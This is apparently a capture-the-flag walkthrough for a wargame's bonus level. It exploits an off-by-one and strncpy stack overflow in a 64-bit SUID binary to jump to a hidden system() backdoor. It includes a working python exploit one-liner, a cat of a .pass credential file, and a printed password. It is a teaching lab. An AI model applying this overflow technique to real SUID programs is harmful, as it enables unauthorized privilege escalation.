# Level 09 — Practical walkthrough (bonus)

> 🔓 **Flaw:** off-by-one in the username copy, which corrupts the message length field
> 🎯 **Target:** the saved return address (RSP) of `handle_msg`, redirected to `secret_backdoor()`
> 🛠️ **Technique:** overwrite `len_message` → oversize `strncpy` → stack overflow → jump to the backdoor, then feed it `/bin/sh`.

All commands are run as user `level09`. This binary is **64-bit** (the return address sits in
`RSP` here), and PIE with ASLR disabled on the VM (addresses are stable `0x5555...`).

## 1. Observe the program

🟦 **Goal:** confirm the SUID bit and the message flow.

🟨 **Terminal:**

```bash
ls -l ./level09
./level09
```

⬜ **Output (excerpt):**

```text
-rwsr-s---+ 1 end users 12959 Oct  2  2016 level09
>: Enter your username
>>: Drew
>: Welcome, Drew
>: Msg @Unix-Dude
>>: Dear Unix-Dude
>: Msg sent!
```

Owned by `end` and SUID. It reads a username and a message.

## 2. Find the backdoor and the bug

🟦 **Goal:** locate the win function and the memory-corruption primitive.

🟨 **Terminal:**

```bash
gdb ./level09
```

🟨 **GDB:**

```gdb
info functions
disassemble set_username
disassemble set_msg
print secret_backdoor
```

`info functions` lists the program's own functions (ignore the `@plt` libc stubs) — this is
how we spot the hidden `secret_backdoor` (never called by the program) plus `set_username`,
`set_msg` and `handle_msg`.

Findings:

- A hidden `secret_backdoor()` reads a line and runs it via `system()` — our goal is to jump
  there and type `/bin/sh`.
- The struct is `{ char message_body[140]; char sender[40]; int body_len; }`.
- `set_username` copies with `i <= 40` — an **off-by-one** that writes 41 bytes, the 41st
  landing in `body_len` (right after the 40-byte sender field).
- `set_msg` does `strncpy(message_body, buffer, body_len)`. If we inflate `body_len`, this
  copy overflows `message_body[140]` and reaches the saved return address.
- `secret_backdoor` address:

⬜ **Output:**

```text
$1 = ... 0x55555555488c <secret_backdoor>
```

## 3. Corrupt the length field

🟦 **Goal:** overwrite `body_len` (default 140) with a large byte so `strncpy` copies far
past the buffer. `\xff` (255) is plenty.

🟨 **Terminal:**

```bash
(python -c 'print "A" * 40 + "\xff"'; cat) | ./level09
```

⬜ **Output:**

```text
...
Segmentation fault (core dumped)
```

The crash confirms the message copy now overflows.

## 4. Find the RSP offset

🟦 **Goal:** measure how many message bytes reach the saved return address. Feed a cyclic
pattern as the message (after the 41-byte username) and read `$rsp` at the crash.

🟨 **GDB:**

```gdb
run
```

🟨 **Feed two inputs** (the `>: Enter your username` / `>: Msg @Unix-Dude` lines are prompts
printed by the program). The username carries a raw `\xff` byte, so pipe it from python
rather than typing it:

- at the username prompt: `"A"*40 + "\xff"`
- at the message prompt: a cyclic pattern (e.g. `Aa0Aa1Aa2...`)

```bash
(python -c 'print "A"*40 + "\xff" + "\n" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah"'; cat) | ./level09
```

🟨 **GDB:**

```gdb
x/s $rsp
```

⬜ **Output:**

```text
0x7fffffffe588:  "6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah"
```

That substring sits at offset **200** in the pattern — so 200 bytes of message reach the
return address.

## 5. Build and run the exploit

🟦 **Goal:** assemble both inputs — username (40 + `\xff`) and message (200 padding +
`&secret_backdoor`) — then send `/bin/sh` to the backdoor's `fgets`.

```text
username = "A"*40 + "\xff"
message  = "A"*200 + <address of secret_backdoor, little-endian>
then      "/bin/sh"
```

`0x55555555488c` little-endian is `\x8c\x48\x55\x55\x55\x55\x00`.

🟨 **Terminal:**

```bash
(python -c 'print "A"*40 + "\xff" + "\n" + "A"*200 + "\x8c\x48\x55\x55\x55\x55\x00" + "\n" + "/bin/sh"'; cat) | ./level09
```

🟨 **In the shell:**

```bash
whoami
cat /home/users/end/.pass
```

⬜ **Output:**

```text
end
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

## 6. Reach `end`

🟨 **Terminal:**

```bash
su end
```

(Enter the password above.) Then:

🟨 **In the shell:**

```bash
whoami
cat ~/end
```

⬜ **Output:**

```text
end
GG !
```

Good game — the obligatory levels plus the bonus are complete. (Becoming `root` is
out of scope and counts as cheating.)
